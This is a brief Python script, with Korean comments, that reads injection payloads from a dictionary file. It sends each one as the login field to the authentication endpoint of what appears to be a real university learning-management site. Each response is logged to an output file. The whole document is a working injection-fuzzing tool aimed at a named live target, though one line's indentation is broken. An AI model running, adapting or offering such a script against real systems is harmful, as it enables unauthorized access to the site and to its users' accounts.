# !/usr/bin/python3
import requests
import sys

print("Start Injection")

sys.stdout = open('./output/[filename].txt', 'w', encoding='utf-8')

url = "https://ieilms.jbnu.ac.kr/login/authLoginProc.jsp"

f = open("[dic].txt", "r")
injection_code = f.read().split("\n") # list 형태로 저장
f.close()

passwd = 'test123'

for i in injection_code:
    r = requests.post(url, data = {'login':str(i), 'passwd':passwd})
		print('#####', i, r.status_code, '#####') # "##### [injection_code] 200 #####" 처럼 출력
    print(r.text+"\n")

print("Finish Injection")